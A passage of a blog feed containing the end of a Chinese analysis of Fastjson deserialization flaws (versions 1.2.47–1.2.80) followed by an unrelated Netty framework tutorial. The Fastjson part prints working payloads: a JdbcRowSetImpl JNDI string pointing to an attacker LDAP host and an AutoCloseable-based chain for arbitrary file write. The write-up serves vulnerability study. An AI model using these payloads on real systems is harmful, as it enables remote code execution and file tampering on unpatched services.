class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;injection\&quot;: &#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, \&quot;utilization\&quot;: &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://10.10.10.128:1389/Exploit\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">pocObj</span> <span class="operator">=</span> JSONObject.parseObject(poc);</span><br><span class="line">        System.out.println(pocObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/fastjson反序列化漏洞学习（二）/poc_1.gif" /></p><h1 id="fastjson-1.2.68">FastJson 1.2.68</h1><blockquote><p>安全说明：<ahref="https://github.com/alibaba/fastjson/wiki/security_update_20200601">security_update_20200601· alibaba/fastjson Wiki (github.com)</a></p></blockquote><h2 id="温故-1">温故</h2><p>先尝试一下47的payload：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502130316016.png" /></p><p>看一下修改的地方：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502131604632.png" /></p><p>嗯？这不是后面那个黑白名单吗？怎么会走到这里来？不应该第二次拿到第一次注入后的就直接返回了吗？跟进看一下第一次的恶意类是否真的投放进去了：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502132744275.png" /></p><p>行吧，那可控吗？</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502133249856.png" /></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230428154041333.png" /></p><h2 id="知新-1">知新</h2><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502133652318.png" /></p><p>官方说明中提到新增加了safeMode：</p><p><img src="/img/fastjson反序列化漏洞学习（二）/image-20230502134545963.png" style="zoom:60%;" /></p><p>这个功能默认false是关闭的，如果你开启了，那就会完全禁用<code>autoType</code>从而完全避免开启了autoType的类型的攻击。当然也要考虑业务需求。</p><p><strong>然而</strong>，该版本仍然存在绕过<code>autoType</code>的漏洞。我们重新回到47版本中的if分支地方：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502142605878.png" /></p><p>上面的分支我们已经没有办法利用了，在黑白名单判断之前，还有一个分支也就是红框圈出的地方。这个expectClass是什么来头？</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502191335633.png" /></p><p>可以看到是checkAutoType传入的，而默认的传入是null：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502194040334.png" /></p><p>而在红框判断中，<strong>若expectClass为空，则直接返回clazz供反序列化；若expectClass非空则若：</strong></p><ul><li>不是HashMap类型 <strong>且</strong></li><li>属于待反序列化的类的子类(<code>isAssignableFrom</code>方法用于判断参数是否是当前对象的子类)</li></ul><p>就会直接返回clazz供反序列化。那我们大致思路有了，其实和47版本的<strong>两阶段</strong>是类似的：</p><ol type="1"><li>首先反序列化一个类，此时expectClass为空，并正常返回clazz供反序列化。</li><li>反序列化第二个类时，令这个类是我们传入的第一个类的子类，从而绕过这个抛出异常语句而直接返回。</li></ol><p><strong>有没有什么办法在第一次checkAutoType后，再次进入checkAutoType并传入expectClass以返回恶意类呢？</strong>答案是使用<code>java.lang.AutoCloseable</code>接口类。我们先用如下输入测试一下流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2023/4/26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;: \&quot;java.io.FileOutputStream\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">pocObj</span> <span class="operator">=</span> JSONObject.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502200306317.png" /></p><p>可以看到Mapping中是有这个类的，并正常返回：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502200402334.png" /></p><p>准备反序列化，这里会使用<code>paser.deserializer.JavaBeanDeserializer</code>来做反序列化工作：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502200716098.png" /></p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502200745231.png" /></p><p>进入后，来到如下代码片段：</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502202532059.png" /></p><p>注意，此时已经开始要解析第二个类了。构造上我们选取了FileOutputStream，他实现了<code>AutoCloseable</code>接口，红框中可以看到，<code>expectClass</code>此时为我们传入的第一个接口类，然后准备进入<code>checkAutoType</code>函数。</p><p><imgsrc="/img/fastjson反序列化漏洞学习（二）/image-20230502203841789.png" /></p><p>进入之后，由于不存在于黑名单、也不是mapping中的，因此略过前面判断以及黑白名单扫描，到达上图代码位置。由于expectClass非空、且clazz(此处为<code>FileOutputStream</code>)为expectClass的子类，因此会将这个类添加到mapping中并返回。</p><p><strong>至此，我们其实是实现了47版本漏洞中第一阶段的效果：污染mapping。</strong>后面再跟一个待反序列化的恶意类从而构成gadget就可以利用了。</p><p><strong>但是，有一个条件，这样的利用方式就要求恶意类必须实现了AutoCloseable接口。</strong>最典型的、直观能想到的，那肯定就是文件类了，但是<code>FileOutputStream</code>的构造器指向的是文件，不能添加一些其他可控的参数，比如写入什么内容。因此网上可以看到一些人的文章都会使用<code>FileOutputStream</code>的子类或类似的其他类，这一部分的话通常可以实现比如任意文件写入：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;@type&#x27;<span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;@type&#x27;<span class="punctuation">:</span> &#x27;sun.rmi.server.MarshalOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;out&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        &#x27;@type&#x27;<span class="punctuation">:</span> &#x27;java.util.zip.InflaterOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">        &#x27;out&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            &#x27;@type&#x27;<span class="punctuation">:</span> &#x27;java.io.FileOutputStream&#x27;<span class="punctuation">,</span></span><br><span class="line">            &#x27;file&#x27;<span class="punctuation">:</span> &#x27;dst&#x27;<span class="punctuation">,</span></span><br><span class="line">            &#x27;append&#x27;<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        &#x27;infl&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            &#x27;input&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                &#x27;array&#x27;<span class="punctuation">:</span> &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;<span class="punctuation">,</span></span><br><span class="line">                &#x27;limit&#x27;<span class="punctuation">:</span> <span class="number">22</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        &#x27;bufLen&#x27;<span class="punctuation">:</span> <span class="number">1048576</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;protocolVersion&#x27;<span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="fastjson-1.2.80">FastJson 1.2.80</h1><p>这应该是FastJson1.2.x最新的漏洞信息了，提示用户应该尽快升级到最新的1.2.83版本。</p><blockquote><p>安全说明：<ahref="https://github.com/alibaba/fastjson/wiki/security_update_20220523">security_update_20220523· alibaba/fastjson Wiki (github.com)</a></p></blockquote><h1 id="参考">参考</h1><p>https://su18.org/post/fastjson</p><p><a href="https://y4er.com/posts/fastjson-learn/">Fastjson反序列化RCE分析 - Y4er的博客</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;紧跟&lt;a
href=&quot;https://lzwgiter.github.io/posts/c99165fd.html&quot;&gt;上一篇&lt;/a&gt;，继续补一下fastjson的审计，复现和分析范围包括1.2.47-1.2.80。&lt;/p&gt;
&lt;p&gt;&lt;img
src=&quot;/img/fastjson反序列化漏洞学习（二）/33f3fdfdbd7163516bd4eb85bbcb34a7.png&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="https://lzwgiter.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="漏洞分析" scheme="https://lzwgiter.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="web安全" scheme="https://lzwgiter.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Netty框架学习</title>
    <link href="https://lzwgiter.github.io/posts/undefined.html"/>
    <id>https://lzwgiter.github.io/posts/undefined.html</id>
    <published>2023-01-07T12:20:38.000Z</published>
    <updated>2023-01-19T12:04:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本篇学习一下Netty框架，Netty是一个Java实现的、非常流行的NIO网络编程框架，很多知名项目如a阿里的Dubbo、Spark、ElasticSearch、Hadoop、蚂蚁金服的SOFABolt、谷歌的gRPC等等。学习前建议先掌握Java中NIO相关API的使用，并理解Unix操作系统中I/O多路复用模型的理论。</p><p><img src="/img/Netty框架学习/components.png" alt="components" style="zoom:100%;" /></p></blockquote><span id="more"></span><h1id="什么是netty为了解决什么问题">什么是Netty？为了解决什么问题？</h1><h2 id="netty">Netty</h2><p>引用一下官方的描述：</p><blockquote><p>Netty is an NIO client server framework which enables quick and easydevelopment of network applications such as protocol servers andclients. It greatly simplifies and streamlines network programming suchas TCP and UDP socket server.</p><p>Netty是一个NIO客户机-服务器框架，它可以快速方便地开发网络应用程序，如协议服务器和客户端。它大大简化和简化了网络编程，如TCP和UDP套接字服务器。</p></blockquote><p>Netty本身其实是一个基于JavaNIO开发的框架，帮助我们快速开发网络应用而不需要在处理通信流程上花心思。也正因为这样，他也不需要啥其他的依赖，就靠JDK自身就行。Netty3.x版本最低要求为JDK 5而Netty 4.x的最低要求是JDK 6。</p><h2 id="解决什么问题呢">解决什么问题呢？</h2><p>我自己的理解。看似是个简单的封装，实际上Netty是有很多的创新点的。首先，他使得我们免于编写大量关于JavaNIO代码的，这部分涉及到熟悉常用类、多线程编程、JDK 1.7及之前中的epollbug等等，这大大降低了我们开发的复杂度。其次，他的性能是要比Java原生的性能要更好的，具体来说：</p><ul><li>更高的吞吐量以及更低的延迟</li><li>更低的资源消耗</li><li>更少的内存复制（Zero-Copy技术）</li></ul><p>那他是怎么解决的呢？我自己的理解总结一句话是这样的：</p><blockquote><p>Netty是基于多路I/O复用机制实现了同步非阻塞I/O模型，此外，通过运用多线程技术，实现了伪异步的能力。</p></blockquote><p>正儿八经的，Netty的出现的理由，除了我上面提到的，就是官方自己的陈述：</p><blockquote><p>...... However, a general purpose protocol or its implementationsometimes does not scale very well. It is like how we don't use ageneral purpose HTTP server to exchange huge files, e-mail messages, andnear-realtime messages such as financial information and multiplayergame data. What's required is a highly optimized protocol implementationthat is dedicated to a special purpose. ......</p><p><em><a href="https://netty.io/">The Netty project</a></em> is aneffort to provide an asynchronous event-driven network applicationframework and tooling for the rapid development of maintainablehigh-performance and high-scalability protocol servers and clients.</p><p>In other words, Netty is an NIO client server framework that enablesquick and easy development of network applications such as protocolservers and clients. It greatly simplifies and streamlines networkprogramming such as TCP and UDP socket server development.</p><p>'Quick and easy' does not mean that a resulting application willsuffer from a maintainability or a performance issue. Netty has beendesigned carefully with the experiences learned from the implementationof a lot of protocols such as FTP, SMTP, HTTP, and various binary andtext-based legacy protocols. As a result, Netty has succeeded to find away to achieve ease of development, performance, stability, andflexibility without a compromise.</p></blockquote><p>大俗话翻译一下：</p><blockquote><p>......然而，通用协议及其实现，如HTTP，他的可扩展性不强。比如我们也不是整天起一个HTTP服务器，然后跟别人交换文件、邮件、实时信息等。为啥子？具体问题具体讨论嘛，我们需要根据具体的需求去设计、去优化得到一个定制化的协议，不然要FTP、SMTP啥的干啥？......</p><p>Netty是一个基于异步事件驱动的网络应用框架，旨在提供可快速开发的、可维护的、高性能、高可扩展的服务器和客户端。</p><p>换言之，Netty是一个使用了NIO的客户端服务器框架爱，能让你快速开发网络应用，比如TCP、UDP套接字开发，肥肠好用。</p><p>虽然但是并不是说Netty快、简单，就代表着它可维护性差、性能差，Netty吸取了诸多前辈协议的实现经验，比如FTP、SMTP、HTTP和其他五花八门的协议。总而言之，很牛。</p></blockquote><h1 id="深入浅出整体架构与基本概念">深入浅出——整体架构与基本概念</h1><h2 id="netty整体架构">Netty整体架构</h2><p>下面我们先深入浅出的看一下Netty是怎么设计的。过程如下：</p><ul><li>首先，我们需要了解一下什么是Reactor模式</li><li>然后看看Netty大体架构设计、流程以及常用类</li><li>看一个简单的Demo，实现时间服务器的功能</li></ul><h3 id="不得不提的reactor模式">不得不提的Reactor模式</h3><p><code>Reactor</code>意思是反应堆，这个倒不是Java的常见24种设计模式，只是一种I/O模式。wiki定义如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The reactor design pattern is an event handling pattern for handling service requests delivered concurrently to a service handler by one or more inputs. The service handler then demultiplexes the incoming requests and dispatches them synchronously to the associated request handlers.</span><br></pre></td></tr></table></figure><p>Reactor模式是一种事件驱动的I/O模式，核心分为服务句柄(<code>service handlers</code>)和请求句柄(<code>reuest handlers</code>)，前者可以处理并发到达的多个输入，并通过后者同步地**将请求派发(dispatch)给不同的请求句柄。其实有点类似生产者消费者模型，只不过没有缓存，而是直接派发了。可以用下图理解：</p><figure><img src="/img/Netty框架学习/Reactor模式.png" alt="Reactor模式" /><figcaption aria-hidden="true">Reactor模式</figcaption></figure><p>其中（我们带入Java语境），<code>Service Handler</code>本质是一个Selector，轮询可用Socket，并将I/O事件分配给<code>Request Handler</code>，在线程池中以<strong>非阻塞的方式</strong>处理用户请求的线程,。下图会更加清晰(来自Java之父Doug Lea，<ahref="http://gee.cs.oswego.edu/dl/cpjslides/nio.pdf">地址</a>)</p><figure><img src="/img/Netty框架学习/image-20230110222829890.png"alt="经典服务模式" /><figcaption aria-hidden="true">经典服务模式</figcaption></figure><p>那中间这个<code>Service Handler</code>我们就把他叫做<code>Reactor</code>，是不是就和一个小的反应堆一样在那里工作？Reactor模式具体来说有三种：</p><ul><li><p>单Reactor单线程模式</p><p><img src="/img/Netty框架学习/image-20230110225253683.png" /></p><p>在该模式下，单个Reactor线程利用Selector进行工作，当监听到客户端连接时，将利用dispatch函数，首先通过acceptor接收一个客户端，再通过handler进行处理客户端的读写。而acceptor和handler的执行都是在<strong>同一个线程中的</strong>，而非新建了一个线程（如下代码，直接<code>run</code>而并非新建了<code>Thread</code>)。</p><p><img src="/img/Netty框架学习/image-20230110230451813.png" /></p><p>这个模式可以满足一些小容量的场景。但是难以满足高负载、大并发的场景，即<strong>可扩展性差</strong>。</p><p>从上面这个模式可以看到，若handler的流程过长，则会拖累reactor，严重会导致大量客户端连接超时的问题。此外，若该单线程除了问题，则会导致<strong>单点失效</strong>的问题。因此我们可以</p><ol type="1"><li><strong>加快handler的执行</strong>，如使用多线程执行不同的非阻塞IO。</li><li><strong>使用多个Reactor，</strong>不同Reacor之间负载均衡。</li></ol><p>上面这两个思路都可以提高我们的<strong>可扩展性（Scalability）</strong>，即可以容纳更大的流量。那其实另外两个模式就分别走的是上面这两个思路了。</p></li><li><p>单Reactor多线程模式</p><p><img src="/img/Netty框架学习/image-20230110231021841.png" /></p><p>相较于第一种模式，可以看到，我们在下面增加了一个<strong>线程池</strong>来处理handler，这个还是比较好理解的。</p><p>绝大数场景下，该模式都可以满足性能要求。但极特殊场景下，由于是单个Reactor线程负责监听和处理客户端连接，因此例如百万客户端并发连接、或存在认证等时间开销较大的流程。那单个Reactor就不够了。就得引入<strong>多个Reactor</strong>了。</p></li><li><p>多Reactor多线程模式</p></li></ul><p><img src="/img/Netty框架学习/image-20230110231037066.png" /></p><p>这也是Netty经常采用的Reacor模式了，官方也推荐使用该模型。观察一下有两个特点：</p><ol type="1"><li><strong>有线程池</strong>，即多线程处理客户端请求。</li><li><strong>有两个Reactor</strong>，所以也有人把这个叫<strong>主从Reactor模式</strong>、<strong>1+M+N线程模式</strong>，每一个Reactor都可以是一个线程池。是<strong>业界成熟的服务器程序设计模式</strong>。</li></ol><h3 id="netty架构概览">Netty架构概览</h3><p>Netty整体可以分为三层：服务编排层、事件调度层、网络通信层。如图所示：</p><figure><img src="/img/Netty框架学习/image-20230111001518439.png"alt="Netty三层架构" /><figcaption aria-hidden="true">Netty三层架构</figcaption></figure><p>分别职责如下：</p><ul><li>服务编排层：负责组装各类服务，是Netty的核心业务处理链（可以看到Pipeline字样）</li><li>事件调度层：通过指定的Reactor线程模型，对活动事件进行处理，具体交由相关Handler完成</li><li>网络通信层：监听网络的读写和连接请求，负责将网络层的数据读取到内存缓冲区中。</li></ul><p>ok上面叭叭叭一堆类，其实最下面的网络通信层除了<code>ServerBootstrap</code>，看过我<ahref="https://lzwgiter.github.io/posts/d6b305b7.html">文章</a>的应该已经熟悉了。</p><p>简单说一下，<code>ServerBootstrap</code>类的创建是Netty服务端启动的第一步，即通过Builder模式构建一个服务端类，配置其相关参数，并绑定端口启动。网络通信层就这些内容了。我们从下到上，再看看另外两层：</p><h4 id="事件调度层">事件调度层</h4><p>上面说到，该层的职责是利用<strong>Reactor线程模型</strong>对活动事件进行处理，他的具体实现是与我们采用的Reactor线程模型相关的，比如你用了单Reactor单线程呀、单Reactor多线程呀等那三种。具体来说，是通过<code>ServerBootstrap</code>类指定的。</p><p>核心用到的类有两个：<code>EventLoop</code>和<code>EventLoopGroup</code>。是不是感觉有点<code>Thead</code>和<code>ThreadGroup</code>那味？差不多。下图是这两个类的关系图：</p><figure><img src="/img/Netty框架学习/EventLoopGroup与EventLoop.png"alt="EventLoopGroup与EventLoop" /><figcaption aria-hidden="true">EventLoopGroup与EventLoop</figcaption></figure><p>可以看到而这都继承了<code>EventExecutorGroup</code>接口，而该接口是由JDK提供的<code>ScheduledExecutorServer</code>子接口以及<code>Iterable</code>接口组成的。</p><p>本质上，<code>EventLoop</code>可以看做<strong>处理多个Channel生命周期内所有I/O时间的线程</strong>，而<code>EventLoopGroup</code>则是<strong>注册</strong>这些线程的线程池。而<code>EventLoopGroup</code>是有很多实现和用法的，这一点我们最后再讨论。总之这里知道，该层作用是<strong>根据所设定的Reactor线程模型，利用线程池技术监听和处理网络I/O事件</strong>就好了。</p><h4 id="服务编排层">服务编排层</h4><p>我觉得吧，这名字翻译的不太好，我以为是应用层的什么东西在编排，其实就是<strong>对信息流的拦截操作</strong>。你Servlet、Struts2啥的都有这种类似的设计。</p><p>该层负责组装各类服务，是Netty的核心业务处理链，确保网络事件的动态编排和有序传播。你是不是感觉在哪里听过？对的，类似Servlet技术的拦截过滤器<code>javax.servlet.Filter</code>，具体可以看我的文章：<ahref="https://lzwgiter.github.io/posts/b92dbb83.html#/使用过滤器">JavaEE基础- Servlet · float's blog (lzwgiter.github.io)</a>。</p><p>Netty是一样的原理。Netty将Channel抽象为<code>ChannelPipeline</code>，消息在该管道中流动。然后针对这个管道，我们定义了<strong>I/O事件</strong>的拦截器<code>ChannelHandler</code>（感觉叫<code>ChannelFilter</code>岂不是更好理解），而<code>ChannelPipeline</code>中保存了多个这样的“拦截器"。</p><p>既然是<strong>事件</strong>的拦截器，包含哪些事件呢？由于消息都是I/O的相关消息，所以事件都是与I/O相关的。从大类上可以分为<code>inbound</code>事件和<code>outbound</code>事件。前者通常为由I/O线程触发，后者通常为用户主动发起的网络I/O操作（其实和我们发起一个TCP请求的过程很像，绑定、连接、写、读、关闭）。</p><ul><li>inbound事件(*代表“ChannelHandlerContext”)：<ol type="1"><li>*.fireChannelRegistered() -&gt; Channel注册事件</li><li>*.fireChannelActive() -&gt; TCP链路建立成功，Channel激活事件</li><li>*.fireChannelRead(Object) -&gt; 读事件</li><li>*.fireChannelReadComplete() -&gt; 读操作完成通知事件</li><li>*.fireExceptionCaught(Throwable) -&gt; 异常通知事件</li><li>*.fireUserEventTriggered(Object) -&gt; 用户自定义事件</li><li>*.fireChannelWritabilityChanged() -&gt;Channel的可写状态变化通知事件</li><li>*.fireChannelInactive() -&gt; TCP连接关闭，链路不可用通知事件</li></ol></li><li>outbound事件(*代表“ChannelHandlerContext”)：<ol type="1"><li>*.bind(SocketAddress, ChannelPromise) -&gt; 绑定本地地址事件</li><li>*.connect(SocketAddress, SocketAddress, ChannelPromise) -&gt;连接服务端事件</li><li>*.write(Object, ChannelPromise) -&gt; 写事件</li><li>*.flush() -&gt; 刷新事件</li><li>*.read() -&gt; 读事件</li><li>*.disconnect(ChannelPromise) -&gt; 断开连接事件</li><li>*.close(ChannelPromise) -&gt; 关闭当前Channel事件</li></ol></li></ul><p>上面这些事件数量很多，但是也很好区分。<code>Inbound</code>那都是<code>In</code>了，肯定是消息进来引发的事件（注册channel、TCP握手、读、TCP关闭等），这些事件对应函数的命名都是<code>fire</code>开头的。<code>outbound</code>那肯定就是消息出去引发的事件了（写、刷新等）。</p><p>当我们用户的请求到达Netty后，首先Netty利用底层<code>SocketChannel</code>的read方法读取得到<code>ByteBuf</code>类型的数据。这一步触发了<code>ChannelRead</code>事件，由I/O线程（常用的如<code>NioEventLoop</code>）调用<code>ChannelPipeline</code>的<code>fireChannelRead(Object msg)</code>方法，将消息（<code>ByteBuf</code>类型）传递到<code>ChannelPipeline</code>中。</p><p>处理后，我们再调用<code>write</code>函数返回请求信息，此时会触发write事件，<strong>反方向</strong>经过各个拦截器返回。</p><p>上述<strong>出站和入站</strong>的流程如图所示：</p><p><img src="/img/Netty框架学习/image-20230112220058228.png" alt="ChannelPipeline对I/O事件流的拦截和处理" style="zoom: 80%;" /></p><p>通常，我们需要自己定义一个拦截器并添加到pipeline中。这个操作在Servlet中，我们需要实现<code>javax.servlet.Filter</code>接口，并实现对应的<code>doFilter</code>方法，然后添加注解<code>@WebFilter</code>或写xml文档就可以了。</p><p>那在Netty中（v4版本），对于上述两种不同的事件。对应地，我们需要继承不同的抽象类：</p><ul><li>inbound事件：<code>ChannelInboundHandlerAdapter</code>，下面是定义以及部分方法，我们只需要重写感兴趣的就行了。方法注释中表明了事件，如channelActive注释中<code>Calls &#123;@link ChannelHandlerContext#fireChannelActive()&#125;</code>，这和上面列出的事件是一一对应的。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChannelInboundHandlerAdapter</span> <span class="keyword">extends</span> <span class="title class_">ChannelHandlerAdapter</span> <span class="keyword">implements</span> <span class="title class_">ChannelInboundHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelRegistered()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRegistered</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelRegistered();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelUnregistered()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change behavior.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Skip</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelUnregistered</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.fireChannelUnregistered();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Calls &#123;<span class="doctag">@link</span> ChannelHandlerContext#fireChannelActive()&#125; to forward</span></span><br><span class="line"><span class="comment">     * to the next &#123;<span class="doctag">@link</span> ChannelInboundHandler&#125; in the &#123;<span class="doctag">@link</span> ChannelPipeline&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Sub-classes may override this method to change 